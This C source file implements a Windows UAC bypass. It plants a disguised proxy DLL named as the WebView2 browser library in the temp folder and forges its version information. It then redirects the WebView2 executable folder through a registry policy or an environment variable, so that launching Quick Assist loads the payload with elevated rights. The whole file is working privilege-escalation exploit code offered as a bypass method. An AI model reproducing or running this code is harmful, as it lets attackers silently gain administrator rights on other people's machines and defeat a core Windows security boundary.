/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2025
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     3.69
*
*  DATE:        07 Jul 2025
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmxModifyWebviewExecutableFolderPolicy
*
* Purpose:
*
* Alter WebView BrowserExecutableFolder parameter.
*
*/
BOOLEAN ucmxModifyWebviewExecutableFolderPolicy(
    _In_ LPCWSTR lpPayloadPath
)
{
    BOOLEAN bResult = FALSE;
    HKEY hKey = NULL;

    if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER,
        T_WEBVIEW_POLICY,
        0, NULL,
        REG_OPTION_VOLATILE,
        MAXIMUM_ALLOWED,
        NULL,
        &hKey,
        NULL))
    {
        bResult = (RegSetValueEx(hKey,
            QUICKASSIST_EXE,
            0, REG_SZ,
            (const BYTE*)lpPayloadPath,
            ((DWORD)_strlen(lpPayloadPath) * sizeof(WCHAR)) + sizeof(UNICODE_NULL)) == ERROR_SUCCESS);

        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* ucmxRunQuickAssist
*
* Purpose:
*
* Execute quick assist through direct exe start or protocol.
*
*/
HANDLE ucmxRunQuickAssist()
{
    WCHAR szBuffer[MAX_PATH * 2];
    SHELLEXECUTEINFO shinfo;

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, QUICKASSIST_EXE);

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpVerb = NULL;
    shinfo.lpParameters = NULL;
    shinfo.nShow = SW_MINIMIZE;

    if (GetFileAttributes(szBuffer) != INVALID_FILE_ATTRIBUTES) {
        shinfo.lpFile = szBuffer;
    }
    else {
        shinfo.lpFile = T_QUICKASSIST;
    }

    if (ShellExecuteEx(&shinfo)) {
        return shinfo.hProcess;
    }

    return NULL;
}

/*
* ucmQuickAssistMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack and dll planting.
* https://github.com/R41N3RZUF477/QuickAssist_UAC_Bypass
*
*/
NTSTATUS ucmQuickAssistMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fDirCreated = FALSE, fEnvSet = FALSE;
    HANDLE hProcess;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szPayloadPath[MAX_PATH * 2];
    WCHAR szPayloadFile[MAX_PATH * 2];

    do {

        //
        // Select payload entry point.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_QASSIST,
            FALSE))
        {
            break;
        }

        //
        // Create destination dir "EBWebView\x64" in %temp%.
        //
        _strcpy(szPayloadPath, g_ctx->szTempDirectory);
        _strcat(szPayloadPath, WEBVIEW_DIR);
        if (!CreateDirectory(szPayloadPath, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcat(szPayloadPath, L"\\x64");
        if (!CreateDirectory(szPayloadPath, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        //
        // Drop payload and alter it version info block.
        //
        _strcpy(szPayloadFile, szPayloadPath);
        _strcat(szPayloadFile, TEXT("\\"));
        _strcat(szPayloadFile, EMBEDDEDBROWSERWEBVIEW_DLL);
        if (!supWriteBufferToFile(szPayloadFile, ProxyDll, ProxyDllSize))
            break;

        fDirCreated = TRUE;

        if (!supReplaceVersionInfo(szPayloadFile, (PBYTE)g_webviewvsinfo, sizeof(g_webviewvsinfo), 'qass'))
            break;

        //
        // Relay WebView.
        //
        if (!ucmxModifyWebviewExecutableFolderPolicy(szPayloadPath)) {
            fEnvSet = supSetEnvVariable(FALSE, T_VOLATILE_ENV, WEBVIEW2_FOLRDER_VAR, g_ctx->szTempDirectory);
            if (fEnvSet == FALSE)
                break;
        }

        //
        // Run quick asssist.
        //
        hProcess = ucmxRunQuickAssist();
        if (hProcess == NULL)
            break;

        if (WaitForSingleObject(hProcess, 15000) != WAIT_OBJECT_0) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            break;
        }
        CloseHandle(hProcess);
        MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    supSetGlobalCompletionEvent();

    Sleep(1000);

    if (fEnvSet)
        supSetEnvVariable(TRUE, T_VOLATILE_ENV, WEBVIEW2_FOLRDER_VAR, NULL);

    if (fDirCreated) {
        _strcpy(szPayloadPath, g_ctx->szTempDirectory);
        _strcat(szPayloadPath, WEBVIEW_DIR);
        supRemoveDirectoryRecursive(szPayloadPath);
    }

    return MethodResult;
}
